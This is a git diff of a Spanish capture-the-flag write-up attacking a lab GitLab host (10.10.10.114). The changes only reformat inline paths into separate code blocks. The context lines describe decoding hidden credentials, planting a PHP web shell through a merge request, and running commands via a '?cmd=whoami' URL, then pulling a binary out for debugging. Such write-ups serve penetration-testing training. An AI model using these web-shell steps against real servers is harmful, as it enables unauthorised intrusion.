@@ -56,16 +56,40 @@ nmap -sC -sV -p22,80 10.10.10.114 -oN targeted
 whatweb http://10.10.10.114
 ```
 
-Hay una redirection hacia la routa `http://10.10.10.114/users_sign_in` y vemos un Cookie `_gitlab_session`.
+Hay una redirection hacia la routa 
+```bash
+ http://10.10.10.114/users_sign_in 
+```
+ y vemos un Cookie 
+```bash
+ _gitlab_session 
+```
+.
 Vemos que esta hosteada sobre un NGINX. 
 
 
 #### Checkear la web {-}
 
-Si entramos en la url `http://10.10.10.114`, Vemos la pagina de inicio de session de Gitlab pero no podemos registrarnos. Solo nos podemos loggear.
+Si entramos en la url 
+```bash
+ http://10.10.10.114 
+```
+, Vemos la pagina de inicio de session de Gitlab pero no podemos registrarnos. Solo nos podemos loggear.
 Intentamos con loggins por defecto pero no llegamos a conectarnos.
-Como la enumeracion con **NMAP** nos a mostrado un `robots.txt`, miramos lo que hay por esta routa. Vemos una serie de routas ocultadas. Intentamos ver unas
-cuantas y la unica que nos muestra algo interesante es la routa `http://10.10.10.114/help` donde vemos un fichero `bookmark.html`.
+Como la enumeracion con **NMAP** nos a mostrado un 
+```bash
+ robots.txt 
+```
+, miramos lo que hay por esta routa. Vemos una serie de routas ocultadas. Intentamos ver unas
+cuantas y la unica que nos muestra algo interesante es la routa 
+```bash
+ http://10.10.10.114/help 
+```
+ donde vemos un fichero 
+```bash
+ bookmark.html 
+```
+.
 
 Hay una serie de links y haciendo *Hovering* vemos que el link Gitlab Login nos sale un script un javascript. Analyzando el codigo fuente, vemos una declaracion
 de variable en hexadecimal. La copiamos y la decodificamos para ver lo que es.
@@ -86,7 +110,11 @@ Como tenemos un usuario y una contraseña nos connectamos al panel de inicio.
 
 Como hemos podido connectarnos, analyzamos el contenido del gitlab. 
 Vemos que hay 2 repositorios. En el menu Activity vemos cosas interessante como una especie de **CI/CD** que permite
-tras una merge request updatear el proyecto *Profile* automaticamente. Ademas la routa `/profile` estaba ocultada por el
+tras una merge request updatear el proyecto *Profile* automaticamente. Ademas la routa 
+```bash
+ /profile 
+```
+ estaba ocultada por el
 **robots.txt**.
 
 En el menu Snippets vemos un codigo php
@@ -99,7 +127,11 @@ $result = pg_query($db_connection, "SELECT * FROM profiles");
 
 #### Subimos un archivo php que nos permite ejecutar comandos {-}
 
-Creamos un archivo `s4vishell.php` en el proyecto profile.
+Creamos un archivo 
+```bash
+ s4vishell.php 
+```
+ en el proyecto profile.
 
 ```php
 <?php
@@ -110,7 +142,11 @@ Creamos un archivo `s4vishell.php` en el proyecto profile.
 Hacemos un commit con este fichero y se nos crea una rama diferente de la **master** lo que significa que tenemos que crear una **Merge request**.
 Una vez esta **Merge Request** creada, Vemos que la podemos acceptar sin problemas porque el proyecto nos apartenece.
 
-Si vamos a la url `http://10.10.10.114/profile/s4vishell.php?cmd=whoami` Vemos que tenemos possibilidad de ejecutar comandos a nivel de systema.
+Si vamos a la url 
+```bash
+ http://10.10.10.114/profile/s4vishell.php?cmd=whoami 
+```
+ Vemos que tenemos possibilidad de ejecutar comandos a nivel de systema.
 ## Vuln exploit & Gaining Access {-}
 
 ### Ganando accesso con la s4vishell.php {-}
@@ -171,7 +207,11 @@ which psql
 which php
 ```
 
-Vemos que la utilidad **psql** no existe en la maquina victima, pero como tenemos acceso a la utilidad **php**, tiramos del `php --interactive`
+Vemos que la utilidad **psql** no existe en la maquina victima, pero como tenemos acceso a la utilidad **php**, tiramos del 
+```bash
+ php --interactive 
+```
+
 
 ```bash
 php --interactive
@@ -216,7 +256,11 @@ sudo -l
 ls -l
 ```
 
-No tenemos privilegios claramente definida pero un fichero no llama la atencion. Este fichero que es un `RemoteConnection.exe`, un fichero
+No tenemos privilegios claramente definida pero un fichero no llama la atencion. Este fichero que es un 
+```bash
+ RemoteConnection.exe 
+```
+, un fichero
 windows en una maquina Linux.
 
 Nos descargamos el fichero uzando un base64
@@ -249,7 +293,11 @@ Nos descargamos el fichero uzando un base64
     ```
 
 1. Controlamos los ficheros con md5sum y transferimos el RemoteConnection.exe a una maquina Windos que tiene el Immunity Debugger con el DEP desabilitado.
-1. Lanzando el programa en la maquina Windows, vemos que nos falta una .dll, la descargamos de internet y la ponemos en la routa `C:\Windows\System32`
+1. Lanzando el programa en la maquina Windows, vemos que nos falta una .dll, la descargamos de internet y la ponemos en la routa 
+```bash
+ C:\Windows\System32 
+```
+
 
 
 Ya podemos lanzar el **Immunity Debugger** como administrador
